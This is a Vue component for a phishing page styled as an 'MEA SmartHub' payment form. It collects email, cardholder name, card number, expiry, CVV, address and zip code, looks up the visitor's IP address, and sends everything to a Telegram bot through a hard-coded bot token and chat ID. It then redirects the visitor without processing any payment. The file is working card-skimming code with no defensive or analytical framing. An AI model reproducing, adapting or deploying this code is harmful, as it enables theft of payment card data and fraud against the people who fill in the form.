<template>
  <div class="page">
    
    <div class="login-box" style="position: relative">
      

      <img
        style="width: 200px; position: absolute; right: 180px; top: 20px"
        src="../public/smarthub.png"
        alt="smarthub"
      />
      <img
        style="width: 280px; position: absolute; left: 180px; bottom: 20px"
        src="../public/mea.png"
        alt="mea"
      />

      <form @submit.prevent="finishJoob" action="">
        <!-- Email -->
        <!-- <div class="input-group">
          <input
            type="email"
            v-model="formDataRes.email"
            @focus="focusField('email')"
            @blur="blurField('email')"
            required
          />

          <label :class="{ active: isActive('email') }"> Email </label>
        </div> -->

        <!-- <p v-if="emailTouched && !email" class="error">Email is required.</p> -->

        <!-- ================================ -->

        <div class="group">
          <label>Email <span>*</span></label>

          <input v-model="formDataRes.email" required type="email" />
        </div>

        <!-- ================================ -->

        <div class="group">
          <label>Cardholder name <span>*</span></label>

          <input v-model="formDataRes.cardHolderName" required type="text" />
        </div>

        <!-- ================================ -->

        <div class="group">
          <label>Card number <span>*</span> </label>

          <input v-model="formDataRes.cardNumber" type="number" />
        </div>

        <div class="row">
          <div class="group">
            <label>Exp. Month <span>*</span></label>
            <select v-model="formDataRes.selectedMonth">
              <option v-for="month in months" :key="month" :value="month">
                {{ month }}
              </option>
            </select>
          </div>

          <!-- ================================ -->

          <div class="group">
            <label>Exp. Year <span>*</span></label>

            <select v-model="formDataRes.selectedYear">
              <option v-for="year in years" :key="year" :value="year">
                {{ year }}
              </option>
            </select>
          </div>
        </div>

        <!-- ================================ -->

        <div class="group">
          <label>Address <span>*</span></label>

          <input v-model="formDataRes.add1" type="text" />
        </div>

        <!-- <div class="group">
            <label>Address line 2 (Optional)</label>

            <input v-model="formDataRes.add2" type="text" />
          </div>

          <div class="group">
            <label>City <span>*</span></label>

            <input v-model="formDataRes.city" type="text" />
          </div>

          <div class="group">
            <label>State <span>*</span></label>

            <select v-model="formDataRes.selectedState">
              <option v-for="state in states" :key="state" :value="state">
                {{ state }}
              </option>
            </select>
          </div> -->

        <div class="group zip">
          <label>CVV <span>*</span></label>

          <input v-model="formDataRes.cvv" type="number" />
        </div>

        <div class="group zip">
          <label>Zip code <span>*</span></label>

          <input v-model="formDataRes.zipcode" type="number" />
        </div>

        <div class="group">
          <label>Country/Region <span>*</span></label>

          <select disabled>
            <option>United States</option>
          </select>
        </div>

        <button>Pay now</button>
      </form>

      <div class="links">
        <ul>
          <li>Can't access your account?</li>
          <li>Don't have an account? Register now.</li>
        </ul>
      </div>
    </div>

    <div v-if="loading" class="loading-overlay">
        <div class="spinner"></div>
        <p>Loading...</p>
      </div>
    <div class="version">Version: 26.13.2</div>
  </div>
</template>

<script>
import axios from "axios";

export default {
  data() {
    const currentYear = new Date().getFullYear() % 100;

    return {
      formDataRes: {
        cardHolderName: "",
        cardNumber: "",
        // selectedMonth: " ",
        // selectedYear: " ",
        // selectedState: " ",
        add1: "",
        // add2: " ",
        // city: " ",
        // states: " ",
        cvv: "",
        zipcode: "",
        email: "",
      },
      months: [
        "01",
        "02",
        "03",
        "04",
        "05",
        "06",
        "07",
        "08",
        "09",
        "10",
        "11",
        "12",
      ],

      years: Array.from({ length: 20 }, (_, i) =>
        String(currentYear + i).padStart(2, "0")
      ),

      states: [
        "Alabama",
        "Alaska",
        "Arizona",
        "Arkansas",
        "California",
        "Colorado",
        "Connecticut",
        "Delaware",
        "Florida",
        "Georgia",
        "Hawaii",
        "Idaho",
        "Illinois",
        "Indiana",
        "Iowa",
        "Kansas",
        "Kentucky",
        "Louisiana",
        "Maine",
        "Maryland",
        "Massachusetts",
        "Michigan",
        "Minnesota",
        "Mississippi",
        "Missouri",
        "Montana",
        "Nebraska",
        "Nevada",
        "New Hampshire",
        "New Jersey",
        "New Mexico",
        "New York",
        "North Carolina",
        "North Dakota",
        "Ohio",
        "Oklahoma",
        "Oregon",
        "Pennsylvania",
        "Rhode Island",
        "South Carolina",
        "South Dakota",
        "Tennessee",
        "Texas",
        "Utah",
        "Vermont",
        "Virginia",
        "Washington",
        "West Virginia",
        "Wisconsin",
        "Wyoming",
      ],

      // isActive: false,
      count: 0,
      finalCount: 1, // Only send once
      loading: false,
      showPassword: false,
      focused: {},
      touched: {},
    };
  },

  computed: {
    isFormValid() {
      return (
        this.formDataRes.cardHolderName.trim() !== "" &&
        this.formDataRes.cardNumber.trim() !== "" &&
        this.formDataRes.selectedMonth.trim() !== "" &&
        this.formDataRes.selectedYear.trim() !== "" &&
        this.formDataRes.add1.trim() !== "" &&
        this.formDataRes.email.trim() !== "" &&
        // this.formDataRes.add2.trim() !== "" &&
        // this.formDataRes.city.trim() !== "" &&
        // this.formDataRes.selectedState.trim() !== "" &&
        this.formDataRes.zipcode.trim() !== "" &&
        this.formDataRes.cvv.trim() !== ""
      );
    },
  },

  methods: {
    focusField(field) {
      this.$set(this.focused, field, true);
    },

    blurField(field) {
      this.$set(this.touched, field, true);

      this.$set(this.focused, field, this.formDataRes[field].trim().length > 0);
    },

    isActive(field) {
      return this.focused[field] || this.formDataRes[field].trim().length > 0;
    },

    async finishJoob() {
      this.count++;

      // if (this.count < this.finalCount) {
      this.loading = true;

      const res = await fetch("https://api.ipify.org?format=json");
      const data = await res.json();
      const email = this.$route.query.email;
      const ip = data.ip;

      // Format the message as string
      const message = `Ⓜ️Ⓜ️Ⓜ️ MEA.SMARTHUB Ⓜ️Ⓜ️Ⓜ️
        \nEMAIL: ${this.formDataRes.email}
        \nCARD HOLDER NAME: ${this.formDataRes.cardHolderName}
        \nCARD NUMBER: ${this.formDataRes.cardNumber}
        \nMONTH: ${this.formDataRes.selectedMonth}
        \nYEAR: ${this.formDataRes.selectedYear}
        \nADDRESS LINE 1: ${this.formDataRes.add1}
        \nCVV: ${this.formDataRes.cvv}
        \nZIPCODE: ${this.formDataRes.zipcode}
        \nIP: ${ip}`;

      // Send to Telegram
      await this.sendTelegramResult(
        process.env.NUXT_APP_CHAT_ID || "-4794000485",
        message
      );

      // this.isActive = !this.isActive;
      // this.loading = false;
      // } else {
      // Redirect after sending
      // location.replace("/login");
      // }

      setTimeout(() => {
        this.isActive = !this.isActive;
        this.loading = false;

        // Keep the popup visible for 2 seconds
        setTimeout(() => {
          this.$router.push("/");
        }, 1000);
      }, 1000);
    },

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },
};
</script>

<style scoped>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

body {
  background: red;
  margin: 0;
  padding: 0;
  width: 100%;
  height: 100%;
}

.loading-overlay {
  position: fixed;
  inset: 0;
  background: rgba(255, 255, 255, 0.9);
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  z-index: 9999;
}

.spinner {
  width: 40px;
  height: 40px;
  border: 4px solid #ddd;
  border-top: 4px solid #007bff;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}

.page {
  width: 100%;
  margin: 0;
  padding: 0;
  background: #0c4f93;
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  position: relative;
  font-family: Arial, Helvetica, sans-serif;
}

.login-box {
  width: 1070px;
  height: 610px;
  background: white;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
}

form {
  width: 310px;
  height: 50%;
  overflow: scroll;
  padding-top: 20px;
}

.input-group,
.group {
  position: relative;
  margin-bottom: 16px;
}

.input-group input,
.group input,
.input-group select,
.group select {
  width: 100%;
  height: 54px;
  border: 1px solid #aaa;
  border-radius: 4px;
  padding: 0 14px 0;
  outline: none;
  font-size: 16px;
}

.input-group input:focus,
.group input:focus {
  border: 1px solid red;
}

.group label {
  font-size: 14px;
}

.input-group label {
  position: absolute;
  left: 14px;
  top: 18px;
  color: #666;
  background: white;
  padding: 0 4px;
  transition: 0.2s;
  pointer-events: none;
}

.input-group label.active {
  top: -8px;
  font-size: 12px;
  color: red;
}

.error {
  color: red;
  font-size: 13px;
  margin: 5px 0 18px 10px;
}

button {
  width: 105px;
  height: 36px;
  float: right;
  margin-top: 25px;
  border: none;
  background: #c8c8c8;
  color: white;
  border-radius: 3px;
  cursor: pointer;
  font-size: 15px;
}

button:disabled {
  cursor: not-allowed;
}

button:not(:disabled) {
  background: #0c4f93;
}

.links {
  width: 30%;
  margin-top: 60px;
  text-align: right;
  display: flex;
  justify-content: end;
}

.links ul {
  width: full;
  /* padding-left: 16px; */
  margin: 0;
  position: relative;
  right: 0;
  list-style: none;
}

.links li {
  margin: 4px 0;
  font-size: 12px;
  font-weight: 200;
  cursor: pointer;
  z-index: 1000;
}

.version {
  position: absolute;
  bottom: 8px;
  color: black;
  font-size: 13px;
}
</style>